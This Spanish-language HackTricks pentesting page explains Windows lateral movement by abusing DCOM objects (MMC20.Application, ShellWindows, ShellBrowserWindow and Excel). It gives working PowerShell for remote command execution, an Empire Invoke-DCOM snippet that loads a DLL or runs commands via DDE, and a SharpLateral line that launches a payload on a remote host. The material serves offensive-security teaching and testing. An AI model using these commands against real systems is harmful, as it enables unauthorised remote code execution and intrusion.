# DCOM Exec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? o ¿quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF**? Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop).
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que importan más para poder solucionarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en todo tu stack tecnológico, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

Los objetos **DCOM** (Distributed Component Object Model) son **interesantes** debido a la capacidad de **interactuar** con los objetos **a través de la red**. Microsoft tiene buena documentación sobre DCOM [aquí](https://msdn.microsoft.com/en-us/library/cc226801.aspx) y sobre COM [aquí](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Puedes encontrar una sólida lista de aplicaciones DCOM usando PowerShell, ejecutando `Get-CimInstance Win32_DCOMApplication`.

El objeto COM [Clase de Aplicación MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) te permite automatizar componentes de las operaciones de snap-in de MMC. Al enumerar los diferentes métodos y propiedades dentro de este objeto COM, noté que hay un método llamado `ExecuteShellCommand` bajo Document.ActiveView.

![](<../../.gitbook/assets/image (4) (2) (1) (1).png>)

Puedes leer más sobre ese método [aquí](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Hasta ahora, tenemos una aplicación DCOM a la que podemos acceder a través de la red y puede ejecutar comandos. La pieza final es aprovechar esta aplicación DCOM y el método ExecuteShellCommand para obtener ejecución de código en un host remoto.

Afortunadamente, como administrador, puedes interactuar remotamente con DCOM con PowerShell usando "`[activator]::CreateInstance([type]::GetTypeFromProgID`". Todo lo que necesitas hacer es proporcionarle un DCOM ProgID y una dirección IP. Luego te devolverá una instancia de ese objeto COM de forma remota:

![](<../../.gitbook/assets/image (665).png>)

Entonces es posible invocar el método `ExecuteShellCommand` para iniciar un proceso en el host remoto:

![](<../../.gitbook/assets/image (1) (4) (1).png>)

## ShellWindows & ShellBrowserWindow

El objeto **MMC20.Application** carecía de "[LaunchPermissions](https://technet.microsoft.com/en-us/library/bb633148.aspx)" explícitos, lo que resultó en el conjunto de permisos predeterminado que permite el acceso a los Administradores:

![](<../../.gitbook/assets/image (4) (1) (2).png>)

Puedes leer más sobre ese hilo [aquí](https://twitter.com/tiraniddo/status/817532039771525120).\
Ver qué otros objetos no tienen un conjunto de permisos de lanzamiento explícitos se puede lograr usando [OleView .NET](https://github.com/tyranid/oleviewdotnet) de [@tiraniddo](https://twitter.com/tiraniddo), que tiene excelentes filtros de Python (entre otras cosas). En este caso, podemos filtrar todos los objetos que no tienen un permiso de lanzamiento explícito. Al hacerlo, dos objetos me llamaron la atención: `ShellBrowserWindow` y `ShellWindows`:

![](<../../.gitbook/assets/image (3) (1) (1) (2).png>)

Otra forma de identificar objetos objetivo potenciales es buscar el valor `LaunchPermission` que falta en las claves en `HKCR:\AppID\{guid}`. Un objeto con permisos de lanzamiento establecidos se verá como a continuación, con datos que representan la ACL para el objeto en formato binario:

![](https://enigma0x3.files.wordpress.com/2017/01/launch\_permissions\_registry.png?w=690\&h=169)

Aquellos sin un LaunchPermission explícito carecerán de esa entrada específica del registro.

### ShellWindows

El primer objeto explorado fue [ShellWindows](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773974\(v=vs.85\).aspx). Dado que no hay un [ProgID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms688254\(v=vs.85\).aspx) asociado con este objeto, podemos usar el método .NET [Type.GetTypeFromCLSID](https://msdn.microsoft.com/en-us/library/system.type.gettypefromclsid\(v=vs.110\).aspx) junto con el método [Activator.CreateInstance](https://msdn.microsoft.com/en-us/library/system.activator.createinstance\(v=vs.110\).aspx) para instanciar el objeto a través de su AppID en un host remoto. Para hacer esto, necesitamos obtener el [CLSID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms691424\(v=vs.85\).aspx) para el objeto ShellWindows, lo cual se puede lograr usando OleView .NET también:

![shellwindow\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellwindow\_classid.png?w=434\&h=424)

Como puedes ver a continuación, el campo "Launch Permission" está en blanco, lo que significa que no se establecen permisos explícitos.

![screen-shot-2017-01-23-at-4-12-24-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-12-24-pm.png?w=455\&h=401)

Ahora que tenemos el CLSID, podemos instanciar el objeto en un objetivo remoto:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>") #9BA05972-F6A8-11CF-A442-00A0C90A8F39
$obj = [System.Activator]::CreateInstance($com)
```
![](https://enigma0x3.files.wordpress.com/2017/01/remote_instantiation_shellwindows.png?w=690&h=354)

Con el objeto instanciado en el host remoto, podemos interactuar con él e invocar cualquier método que queramos. El handle devuelto del objeto revela varios métodos y propiedades, con ninguno de los cuales podemos interactuar. Para lograr una interacción real con el host remoto, necesitamos acceder al método [WindowsShell.Item](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773970\(v=vs.85\).aspx), que nos devolverá un objeto que representa la ventana del shell de Windows:
```
$item = $obj.Item()
```
![](https://enigma0x3.files.wordpress.com/2017/01/item_instantiation.png?w=416&h=465)

Con un control total sobre la ventana Shell, ahora podemos acceder a todos los métodos/propiedades esperados que están expuestos. Después de revisar estos métodos, **`Document.Application.ShellExecute`** resaltó. Asegúrate de seguir los requisitos de parámetros para el método, los cuales están documentados [aquí](https://msdn.microsoft.com/en-us/library/windows/desktop/gg537745(v=vs.85).aspx).
```powershell
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
Como puede ver arriba, nuestro comando se ejecutó con éxito en un host remoto.

### ShellBrowserWindow

Este objeto en particular no existe en Windows 7, lo que limita su uso para movimiento lateral un poco más que el objeto "ShellWindows", el cual probé con éxito en Win7-Win10.

Basado en mi enumeración de este objeto, parece proporcionar efectivamente una interfaz en la ventana del Explorador al igual que el objeto anterior. Para instanciar este objeto, necesitamos obtener su CLSID. Similar a lo anterior, podemos usar OleView .NET:

![shellbrowser\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellbrowser\_classid.png?w=428\&h=414)

Nuevamente, tome nota del campo de Permisos de Lanzamiento en blanco:

![screen-shot-2017-01-23-at-4-13-52-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-13-52-pm.png?w=399\&h=340)

Con el CLSID, podemos repetir los pasos realizados en el objeto anterior para instanciar el objeto y llamar al mismo método:
```powershell
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "<IP>")
$obj = [System.Activator]::CreateInstance($com)

$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\system32", $null, 0)
```
Como puede ver, el comando se ejecutó con éxito en el objetivo remoto.

Dado que este objeto se comunica directamente con el shell de Windows, no necesitamos invocar el método "ShellWindows.Item", como en el objeto anterior.

Aunque estos dos objetos DCOM se pueden utilizar para ejecutar comandos del shell en un host remoto, hay muchos otros métodos interesantes que se pueden usar para enumerar o manipular un objetivo remoto. Algunos de estos métodos incluyen:

* `Document.Application.ServiceStart()`
* `Document.Application.ServiceStop()`
* `Document.Application.IsServiceRunning()`
* `Document.Application.ShutDownWindows()`
* `Document.Application.GetSystemInformation()`

## ExcelDDE & RegisterXLL

De manera similar, es posible moverse lateralmente abusando de objetos DCOM de Excel, para más información lea [https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
```powershell
# Chunk of code from https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
## You can see here how to abuse excel for RCE
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
## Herramientas Automáticas

* El script de Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) permite invocar fácilmente todos los métodos comentados para ejecutar código en otras máquinas.
* También podrías usar [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Referencias

* El primer método fue copiado de [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/), para más información sigue el enlace
* La segunda sección fue copiada de [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/), para más información sigue el enlace

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que importan más para que puedas arreglarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en todo tu stack tecnológico, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? o ¿quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? Revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
